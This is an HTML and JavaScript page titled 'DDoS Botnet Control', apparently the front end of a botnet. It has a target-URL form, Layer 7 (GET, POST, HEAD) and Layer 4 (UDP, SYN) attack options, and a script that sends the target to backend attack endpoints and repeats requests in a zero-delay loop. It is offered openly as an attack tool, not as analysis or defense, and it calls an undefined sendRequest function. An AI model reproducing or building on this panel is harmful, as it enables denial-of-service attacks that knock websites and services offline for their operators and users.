<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS Botnet Control</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f4f4f4;
        }
        h1 {
            color: #333;
        }
        form {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input, select, button {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #007BFF;
            color: white;
            border: none;
        }
        button:hover {
            background-color: #0056b3;
        }
        #console {
            margin-top: 20px;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .log {
            color: #333;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <h1>DDoS Botnet Control</h1>
    <form id="attackForm">
        <label for="targetURL">Target URL:</label>
        <input type="text" id="targetURL" name="targetURL" required>
        <label for="attackType">Attack Type:</label>
        <select id="attackType" name="attackType">
            <option value="layer7">Layer 7</option>
            <option value="layer4">Layer 4</option>
        </select>
        <button type="submit">Start Attack</button>
    </form>
    <button onclick="stopAttack()">Stop Attack</button>

    <div id="console">
        <h2>Attack Logs</h2>
        <div id="logContainer"></div>
    </div>

    <script>
        const logContainer = document.getElementById('logContainer');

        document.getElementById('attackForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const targetURL = document.getElementById('targetURL').value;
            const attackType = document.getElementById('attackType').value;

            if (attackType === 'layer7') {
                startLayer7Attacks(targetURL);
            } else if (attackType === 'layer4') {
                startLayer4Attacks(targetURL);
            }
        });

        function startLayer7Attacks(targetURL) {
            const attacks = ['GET', 'POST', 'HEAD'];
            attacks.forEach(attackType => {
                fetch(`/api/start`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ targetURL, attackType })
                }).then(response => response.text())
                  .then(data => {
                    log(`Started ${attackType} attack: ${data}`);
                    log(`Continuing ${attackType} attack until target reaches limit...`);
                    const interval = setInterval(() => {
                        sendRequest(attackType, targetURL);
                    }, 0);
                  });
            });
        }

        function startLayer4Attacks(targetURL) {
            const attacks = ['UDP', 'SYN'];
            attacks.forEach(attackType => {
                sendPacket(targetURL, attackType);
            });
        }

        async function sendPacket(target, attackType) {
            try {
                await fetch(`/api/send${attackType.toLowerCase()}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ target })
                });
                log(`${attackType} packet sent to ${target}`);
            } catch (error) {
                log(`Error sending ${attackType} packet: ${error}`);
            }
        }

        function stopAttack() {
            fetch('/api/stop', {
                method: 'POST'
            }).then(response => response.text())
              .then(data => {
                log(data);
              });
        }

        function log(message) {
            const logEntry = document.createElement('div');
            logEntry.className = 'log';
            logEntry.textContent = message;
            logContainer.appendChild(logEntry);
            logContainer.scrollTop = logContainer.scrollHeight; // Auto-scroll to bottom
        }
    </script>
</body>
</html>
